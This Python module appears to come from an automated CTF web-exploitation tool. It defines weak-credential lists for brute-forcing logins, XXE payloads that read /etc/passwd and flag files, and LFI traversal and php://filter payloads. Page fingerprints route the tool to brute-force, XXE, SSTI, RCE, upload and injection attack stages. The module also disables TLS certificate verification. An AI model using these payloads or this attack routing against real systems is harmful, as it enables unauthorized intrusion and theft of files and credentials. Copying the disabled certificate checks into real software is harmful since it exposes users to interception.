"""yang_web.core.multi_stage 子模块 _common（自 multi_stage.py 拆分，请勿手工重排）。"""

from __future__ import annotations
import re
import ssl
import time
import json
import base64
import urllib.request
import urllib.error
import urllib.parse
from urllib.parse import urljoin
import http.cookiejar
from typing import Dict, List, Optional, Tuple, Set, Callable
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FuturesTimeoutError





# ═══════════════════════════════════════════════════════════
#  Built-in Payload Libraries
# ═══════════════════════════════════════════════════════════

# Top 50 常见弱口令
COMMON_CREDENTIALS = [
    ("admin", "admin"), ("admin", "admin123"), ("admin", "123456"),
    ("admin", "password"), ("admin", "admin888"), ("admin", "12345678"),
    ("admin", "passwd"), ("admin", "pass"), ("admin", "123"),
    ("admin", ""), ("", ""),
    ("root", "root"), ("root", "123456"), ("root", "admin"),
    ("test", "test"), ("test", "123456"), ("test", "admin"),
    ("guest", "guest"), ("guest", "123456"),
    ("user", "user"), ("user", "123456"),
    ("admin", "admin@123"), ("admin", "Admin"), ("admin", "ADMIN"),
    ("admin", "qwerty"), ("admin", "abc123"), ("admin", "letmein"),
    ("admin", "monkey"), ("admin", "master"), ("admin", "dragon"),
    ("admin", "iloveyou"), ("admin", "trustno1"), ("admin", "111111"),
    ("admin", "654321"), ("admin", "888888"), ("admin", "000000"),
    ("admin", "P@ssw0rd"), ("admin", "Admin123"),
]

# JS 重定向模式
JS_REDIRECT_RE = [
    r"location\.href\s*=\s*['\"]([^'\"]+)['\"]",
    r"window\.location\s*=\s*['\"]([^'\"]+)['\"]",
    r"location\.replace\s*\(\s*['\"]([^'\"]+)['\"]",
    r"self\.location\s*=\s*['\"]([^'\"]+)['\"]",
    r"top\.location\s*=\s*['\"]([^'\"]+)['\"]",
    r"document\.location\s*=\s*['\"]([^'\"]+)['\"]",
]

# XXE payload 套件
XXE_PAYLOADS = {
    "read_flag": '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<root><msg>&xxe;</msg></root>''',

    "read_flag_txt": '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<root><msg>&xxe;</msg></root>''',

    "read_etc_passwd": '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><msg>&xxe;</msg></root>''',

    "php_filter_flag": '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag">
]>
<root><msg>&xxe;</msg></root>''',

    "directory_scan": '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root><msg>&xxe;</msg></root>''',
}

# LFI payload — 登录后常见
LFI_PAYLOADS = [
    "/etc/passwd", "/flag", "/flag.txt", "/var/www/html/flag",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=flag.php",
    "../../../../etc/passwd", "....//....//etc/passwd",
]

# 页面类型指纹
PAGE_FINGERPRINTS = {
    "login": {
        "keywords": ["login", "登录", "signin", "sign in", "auth", "account"],
        "forms": [{"inputs": ["username", "password"]}, {"inputs": ["user", "pass"]},
                  {"inputs": ["name", "pwd"]}, {"inputs": ["email", "password"]}],
        "next_stage": "credential_brute",
    },
    "xxe": {
        "keywords": ["xxe", "xml", "entity"],
        "inputs": ["xml", "data", "payload"],
        "content_types": ["application/xml", "text/xml"],
        "next_stage": "xxe_attack",
    },
    "ssti": {
        "keywords": ["template", "ssti", "render", "view"],
        "inputs": ["template", "tpl", "view", "name", "msg", "input"],
        "next_stage": "ssti_attack",
    },
    "command": {
        "keywords": ["exec", "command", "cmd", "shell", "ping", "rce"],
        "inputs": ["cmd", "command", "exec", "ip", "host", "target"],
        "next_stage": "rce_attack",
    },
    "upload": {
        "keywords": ["upload", "file", "图片", "image", "avatar"],
        "inputs": ["file", "upload", "image"],
        "next_stage": "upload_attack",
    },
    "search": {
        "keywords": ["search", "搜索", "query", "find", "filter"],
        "inputs": ["s", "q", "search", "query", "keyword"],
        "next_stage": "sqli_xss_attack",
    },
    "flag_display": {
        "keywords": ["flag", "your flag", "congrat", "welcome"],
        "is_terminal": True,
    },
}


# ═══════════════════════════════════════════════════════════
#  HTTP Client with Session Support
# ═══════════════════════════════════════════════════════════

_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE

DEFAULT_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Yang-Web-MultiStage/3.6'

FLAG_RE = re.compile(
    r'(?:flag|ctf|iscc|hctf|geesec|nssctf|0xGame|ddctf|realworld|n1ctf|suctf|wmctf|'
    r'dasctf|pico|tjctf|angstrom|dctf|ractf|zh3r0|inctf|darkctf|csictf|ritsec|'
    r'nactf|b01lers|kksctf|moectf|gactf|actf|starctf|ructf|plaidctf|defenit|'
    r'hitcon|balsn|asis|codegate|0ctf|tctf|wctf|hxp|hackthebox|csaw)'
    r'\{[^}]+\}', re.IGNORECASE
)
